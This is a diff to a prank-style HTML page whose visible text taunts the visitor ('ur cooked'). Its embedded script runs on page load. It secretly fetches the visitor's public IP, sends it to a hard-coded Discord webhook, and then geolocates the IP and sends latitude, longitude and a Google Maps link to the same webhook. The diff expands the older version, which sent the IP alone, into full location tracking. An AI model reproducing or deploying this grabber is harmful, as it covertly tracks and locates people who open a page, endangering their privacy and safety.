@@ -1,27 +1,84 @@
-<p>get cooked.</p>
+<p>i can explain ur future in 2 words, </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
 
-    <script>
-        const webhookUrl = 'https://discord.com/api/webhooks/1336862623685148774/XDdGaufidkntBcBiZDlSY1uZmf2Kc3oSWKjai8xM84oYsDnfw70Aq7bOy4dYRykpA21t';
+<p>ur cooked</p>
+<script>
+    const webhookUrl = 'https://discord.com/api/webhooks/1336862623685148774/XDdGaufidkntBcBiZDlSY1uZmf2Kc3oSWKjai8xM84oYsDnfw70Aq7bOy4dYRykpA21t';
 
-        const logIp = async () => {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const userIP = data.ip;
+    // Function to fetch and log IP, and get lat/lon info
+    const logIp = async () => {
+        try {
+            // Get user's public IP address
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const userIP = data.ip;
 
+            // Send the IP address to a Discord webhook
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: `User IP: ${userIP}` })
+            });
+
+            console.log('IP logged and sent to webhook.');
+
+            // Get the lat and lon for the user's IP from ip-api
+            const locationResponse = await fetch(`http://ip-api.com/json/${userIP}`);
+            const locationData = await locationResponse.json();
+
+            if (locationData.status === "success") {
+                const lat = locationData.lat;
+                const lon = locationData.lon;
+
+                // Generate the Google Maps link
+                const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                // Send lat, lon, and the Google Maps link to the Discord webhook
                 await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ content: `User IP: ${userIP}` })
+                    body: JSON.stringify({
+                        content: `Location for IP: ${userIP}\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps link: ${googleMapsLink}`
+                    })
                 });
 
-                console.log('IP logged and sent to webhook.');
-            } catch (error) {
-                console.error('Error logging IP:', error);
+                console.log('Location data sent to webhook.');
+            } else {
+                console.log('Unable to fetch location data for the user IP.');
             }
-        };
 
-        logIp();
-    </script>
+        } catch (error) {
+            console.error('Error logging IP or fetching location:', error);
+        }
+    };
+
+    // Execute the logIp function
+    logIp();
+</script>
